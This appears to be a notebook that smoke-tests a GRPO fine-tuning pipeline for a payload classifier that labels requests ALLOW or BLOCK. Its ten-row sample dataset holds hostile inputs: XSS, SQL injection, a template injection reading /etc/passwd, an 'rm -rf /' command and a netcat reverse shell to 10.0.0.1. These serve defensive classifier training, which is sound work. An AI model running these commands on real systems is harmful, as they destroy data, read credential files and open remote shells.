# MINI TEST - Validate GRPO Pipeline (10 rows, 2 steps)

Run this locally to confirm the full pipeline works before burning HF GPU credits.
If this completes without errors, the main notebook will too.

In [ ]:
# Cell 0: Install (same as main notebook)
import subprocess, sys, shutil, pathlib, glob

def run_cmd(cmd):
    print(f">>> {cmd}")
    r = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if r.stdout:
        for line in r.stdout.strip().split("\n")[-20:]:
            print(line)
    if r.returncode != 0:
        print(f"WARNING: exit code {r.returncode}")

# Wipe compiled cache
for _c in [
    pathlib.Path("/data/unsloth_compiled_cache"),
    pathlib.Path.home() / ".cache" / "unsloth_compiled_cache",
    pathlib.Path("/tmp/unsloth_compiled_cache"),
]:
    if _c.exists():
        print(f"Removing: {_c}")
        shutil.rmtree(_c, ignore_errors=True)

# Fix corrupted pip metadata
for bad in glob.glob(str(pathlib.Path(sys.prefix) / "lib" / "python*" / "site-packages" / "-*")):
    print(f"Removing corrupted dist: {bad}")
    shutil.rmtree(bad, ignore_errors=True)

run_cmd(f"{sys.executable} -m pip install -q --upgrade pip")
run_cmd(f"{sys.executable} -m pip install -q --upgrade --force-reinstall --no-cache-dir unsloth unsloth_zoo")
run_cmd(f'{sys.executable} -m pip install -q \"trl==0.24.0\"')
run_cmd(f"{sys.executable} -m pip install -q datasets bitsandbytes")

run_cmd(
    f"{sys.executable} -c \""
    "import torch, transformers, trl, peft; "
    "from importlib.metadata import version; "
    "print('torch', torch.__version__); "
    "print('transformers', transformers.__version__); "
    "print('trl', trl.__version__); "
    "print('peft', peft.__version__); "
    "print('unsloth', version('unsloth')); "
    "print('tokenizers', version('tokenizers'))\""
)
print("\n=== RESTART KERNEL NOW, then run all cells below ===")

In [ ]:
# Cell 1: PatchFastRL + Load Model
from unsloth import FastLanguageModel, PatchFastRL
PatchFastRL("GRPO", FastLanguageModel)

import torch
print(f"CUDA: {torch.cuda.is_available()}")
if torch.cuda.is_available():
    print(f"GPU: {torch.cuda.get_device_name(0)}")

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name="unsloth/Qwen2.5-3B-Instruct",
    max_seq_length=512,
    load_in_4bit=True,
    dtype=None,
)

if tokenizer.pad_token_id is None:
    tokenizer.pad_token = tokenizer.eos_token

model = FastLanguageModel.get_peft_model(
    model,
    r=16,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj",
                    "gate_proj", "up_proj", "down_proj"],
    lora_alpha=16,
    use_gradient_checkpointing="unsloth",
    random_state=3407,
)

print("Model + LoRA loaded OK")

In [ ]:
# Cell 2: Tiny dataset (10 rows, no external data needed)
from datasets import Dataset

SYSTEM_PROMPT = "You are a security agent. Classify the payload as ALLOW or BLOCK. Respond with JSON: {\"action\": \"ALLOW\" or \"BLOCK\", \"confidence\": 0.0-1.0, \"rationale\": \"why\"}"

payloads = [
    "GET /api/v1/users HTTP/1.1\nHost: example.com",
    "POST /login\n{\"user\": \"admin\", \"pass\": \"password123\"}",
    "GET /search?q=<script>alert('xss')</script>",
    "SELECT * FROM users WHERE id=1 OR 1=1--",
    "GET /api/health HTTP/1.1",
    "POST /upload\n{{__import__('os').system('cat /etc/passwd')}}",
    "GET /static/style.css HTTP/1.1",
    "; rm -rf / --no-preserve-root",
    "GET /api/v2/products?page=1&limit=20 HTTP/1.1",
    "__import__('subprocess').call(['nc', '-e', '/bin/sh', '10.0.0.1', '4444'])",
]

rows = []
for p in payloads:
    rows.append({
        "prompt": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": f"INCOMING PAYLOAD:\n{p}\n\nRespond with your action JSON."},
        ]
    })

dataset = Dataset.from_list(rows)
print(f"Dataset: {len(dataset)} rows")
print(f"Sample prompt: {dataset[0]['prompt'][1]['content'][:80]}...")

In [ ]:
# Cell 3: Reward functions (minimal)
import re, json

def reward_format(completions, **kwargs):
    scores = []
    for c in completions:
        text = c[0]["content"] if isinstance(c, list) else str(c)
        m = re.search(r'\{[^{}]*"action"[^{}]*\}', text, re.DOTALL)
        if m:
            try:
                d = json.loads(m.group(0))
                if d.get("action") in ("ALLOW", "BLOCK"):
                    scores.append(1.0)
                else:
                    scores.append(-0.5)
            except Exception:
                scores.append(-1.0)
        else:
            scores.append(-2.0)
    return scores

print("Reward function OK")

In [ ]:
# Cell 4: Create GRPO Trainer (2 steps only)
from trl import GRPOConfig, GRPOTrainer

training_args = GRPOConfig(
    learning_rate=5e-6,
    per_device_train_batch_size=1,
    gradient_accumulation_steps=1,
    num_generations=2,
    max_prompt_length=256,
    max_completion_length=256,
    max_steps=2,
    logging_steps=1,
    save_steps=999,
    report_to="none",
    output_dir="mini_test_output",
    bf16=torch.cuda.is_bf16_supported() if torch.cuda.is_available() else False,
    fp16=False,
)

trainer = GRPOTrainer(
    model=model,
    processing_class=tokenizer,
    reward_funcs=[reward_format],
    args=training_args,
    train_dataset=dataset,
)

print("Trainer created OK")

In [ ]:
# Cell 5: TRAIN (2 steps)
print("Starting mini GRPO training (2 steps)...")
trainer.train()
print("\n=== SUCCESS: Pipeline works end-to-end! ===")
print("The main notebook will work on HF. Go run it.")